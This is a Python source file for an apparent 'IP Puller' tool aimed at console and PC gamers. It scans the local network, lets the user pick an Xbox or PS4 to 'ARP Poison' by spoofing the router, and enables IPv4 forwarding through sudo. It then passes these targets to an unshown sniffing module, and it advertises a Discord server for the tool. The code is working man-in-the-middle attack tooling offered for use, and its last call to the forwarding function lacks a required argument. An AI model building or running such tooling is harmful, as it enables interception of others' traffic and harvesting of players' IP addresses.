import os
import puller2 as puller
import scapy.all as scapy
import ipaddress
import windows

settings = {}


with open("puller.settings", "r") as f:
    for line in f.readlines():
        settings_name, setting = line.split(" ")
        settings[settings_name.strip()] = setting.strip()



active_interface = []


def recieve_interface():
    if os.name == "posix":
        cmd = "ip a | grep \"state UP\" | awk -F: '{print $2}' | tr -d ' '"
        interfaces = os.popen(cmd).read()
        interfaces = str(interfaces).split()
        count = 0
        for interface in interfaces:
            count += 1
            print(f"{count}: {interface}")

        pick = input("Pick an interface: ")
        return interfaces[int(pick)-1]
    elif os.name == "nt":
        return windows.recieve_interface()
    else:
        return "Invalid operating system"

def RecieveHosts():
    Subnet_list = ("10.0.0.0/24", "192.168.1.0/24", "192.168.0.0/24")

    if settings["subnet"] == "null":
        Subnet = input("1. 10.0.0.1\n2. 192.168.1.1\n3. 192.168.0.1\nRouter IP: ")


    Local_Host_Info = {}
    if settings["subnet"] != "null":
        results = scapy.arping(settings["subnet"], verbose=0)[0]
    else:
        results = scapy.arping(Subnet_list[int(Subnet) - 1], verbose=0)[0]
    for i in results:
        Local_Host_Info[i[1].psrc] = i[1].hwsrc
    del results
    if settings["subnet"] == "null":
        return Local_Host_Info, Subnet_list[int(Subnet) - 1]
    else:
        return Local_Host_Info


def Allow_ipv4_fowarding(status, interface):
    ##0 off
    ##1 on
    if os.name == "posix":
        if settings["mobile"] == "no":
            with os.popen("sudo sysctl net.ipv4.ip_forward") as status_:
                if status_.read().strip() == "net.ipv4.ip_forward = 0":

                    if status == 1:
                        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
            if status == 0:
                os.system("sudo sysctl -w net.ipv4.ip_forward=0")
            del status
            del status_
    elif os.name == "nt":
        if status == 1:
            windows.enable_ipv4_forwarding_win(interface, 1)
        if status == 0:
            windows.enable_ipv4_forwarding_win(interface, 0)


def main_page():
    if os.name == "nt":
        os.system("cls")
    elif os.name == "posix":
        os.system("clear")
    art = """
  ▄▄▄▄▄▄   ▄▄▄▄▄▄              ▄▄▄▄▄▄              ▄▄▄▄      ▄▄▄▄                         
  ▀▀██▀▀   ██▀▀▀▀█▄            ██▀▀▀▀█▄            ▀▀██      ▀▀██                         
    ██     ██    ██            ██    ██  ██    ██    ██        ██       ▄████▄    ██▄████ 
    ██     ██████▀             ██████▀   ██    ██    ██        ██      ██▄▄▄▄██   ██▀     
    ██     ██                  ██        ██    ██    ██        ██      ██▀▀▀▀▀▀   ██      
  ▄▄██▄▄   ██                  ██        ██▄▄▄███    ██▄▄▄     ██▄▄▄   ▀██▄▄▄▄█   ██      
  ▀▀▀▀▀▀   ▀▀                  ▀▀         ▀▀▀▀ ▀▀     ▀▀▀▀      ▀▀▀▀     ▀▀▀▀▀    ▀▀ 
  """
    print(art)
    pick = input("1. Ease of Use Settings\n2. Discord Server\npress enter to continue\nChoice (1-2): ")

    if str(pick) == "1":

        stop = True
        while stop:
            if os.name == "nt":
                os.system("cls")
            elif os.name == "posix":
                os.system("clear")
            art = """
   ▄▄▄▄                                     ██                                  
 ▄█▀▀▀▀█               ██        ██         ▀▀                                  
 ██▄        ▄████▄   ███████   ███████    ████     ██▄████▄   ▄███▄██  ▄▄█████▄ 
  ▀████▄   ██▄▄▄▄██    ██        ██         ██     ██▀   ██  ██▀  ▀██  ██▄▄▄▄ ▀ 
      ▀██  ██▀▀▀▀▀▀    ██        ██         ██     ██    ██  ██    ██   ▀▀▀▀██▄ 
 █▄▄▄▄▄█▀  ▀██▄▄▄▄█    ██▄▄▄     ██▄▄▄   ▄▄▄██▄▄▄  ██    ██  ▀██▄▄███  █▄▄▄▄▄██ 
  ▀▀▀▀▀      ▀▀▀▀▀      ▀▀▀▀      ▀▀▀▀   ▀▀▀▀▀▀▀▀  ▀▀    ▀▀   ▄▀▀▀ ██   ▀▀▀▀▀▀  
                                                              ▀████▀▀
==================================================================================
            """
            print(art)
            print(f"Interface: {settings['interface']}\nSubnet: {settings['subnet']}\nConsole: {settings['console']}\nConsole_port: {settings['console_port']}\nMobile: {settings['mobile']}")
            print("command: [settings_name] [set] or press enter to continue")
            print("console changes both subnet and console IP")
            input_ = input("> ").lower()
            if input_ == "":
                return
            input_ = input_.split(" ")
            setting = input_[0]
            command = input_[1]
            counter = 0

            if command == "set" and setting == "console":
                settings["subnet"] = "null"
                ips, subnet = RecieveHosts()
                settings["subnet"] = subnet
                sorted_ips = sorted(ips.keys(), key=lambda s: ipaddress.IPv4Address(s))
                for ip in sorted_ips:
                    print(f"{counter + 1}. IP:{ip}")
                    counter += 1
                pick = input("Pick Your Console IP (1-20): ")
                settings["console"] = sorted_ips[int(pick) - 1]
            elif command == "set" and setting == "interface":
                interface = recieve_interface()
                settings["interface"] = interface
            elif command == "set" and setting == "console_port":
                port = input("Enter Consoles Internal Port: ")
                settings["console_port"] = port
            elif command == "set" and setting == "mobile":
                pick = input("Are you using A Mobile Phone (Rooted) ?\n1. (yes)\n2. (no)")
                if pick == "1":
                    settings["mobile"] = "yes"
                elif pick == "2":
                    settings["mobile"] = "no"
            with open("puller.settings", "w") as f:
                f.write(f"interface {settings['interface']}\nsubnet {settings['subnet']}\nconsole {settings['console']}\nconsole_port {settings['console_port']}\nmobile {settings['mobile']}")
    elif pick == "2":
        print("Discord Server Code: AXHy4A4U\nDiscord Username: Reggie2561")
        input("Press ENTER to Continue")
        main_page()
def main():

    counter = 0
    main_page()
    if os.name == "nt":
        os.system("cls")
    elif os.name == "posix":
        os.system("clear")

    ip_macs = RecieveHosts()

    if settings["console"] not in ip_macs.keys():
        print("OLD CONSOLE IP NO LONGER VALID.")
    sorted_ips = sorted(ip_macs.keys(), key=lambda s: ipaddress.IPv4Address(s))
    sniffing_option = input("1. Xbox / PS4\n2. Local (PC Games)\nChoice: ")
    if settings["interface"] == "null":
        interface = recieve_interface()
    else:
        interface = settings["interface"]
    if sniffing_option == "1" and settings["console"] == "null":
        for ip in sorted_ips:
            print(f"{counter + 1}. IP:{ip}      MAC:{ip_macs[ip]}")
            counter += 1
        del counter
        pick = input("Please Pick a Device you would like to ARP Poison (1-20): ")

        Target_IP = sorted_ips[int(pick)-1]
        Target_MAC = ip_macs[Target_IP]
        Spoof_IP = sorted_ips[0]
        Spoof_MAC = ip_macs[Spoof_IP]


        Allow_ipv4_fowarding(1, interface)




        del pick
    elif sniffing_option == "1" and settings["console"] != "null":
        ip = settings["console"]

        Target_IP = ip
        Target_MAC = ip_macs[ip]
        Spoof_IP = sorted_ips[0]
        Spoof_MAC = ip_macs[Spoof_IP]
    elif sniffing_option == "2":
        Target_IP = None
        Target_MAC = None
        Spoof_IP = None
        Spoof_MAC = None



    ### starting sniffing alg
    if os.name == "nt":
        os.system("cls")
    elif os.name == "posix":
        os.system("clear")

    if settings["console_port"] == "null":
        Console_port = input("Enters Console Internal Port: ")
    else:
        Console_port = settings["console_port"]

    puller.startthread(Target_IP, Target_MAC, Spoof_IP, Spoof_MAC, list(sorted_ips), interface, Console_port, settings["mobile"])



    del Target_IP
    del Target_MAC
    del Spoof_IP

    del interface
    Allow_ipv4_fowarding(0)

main()
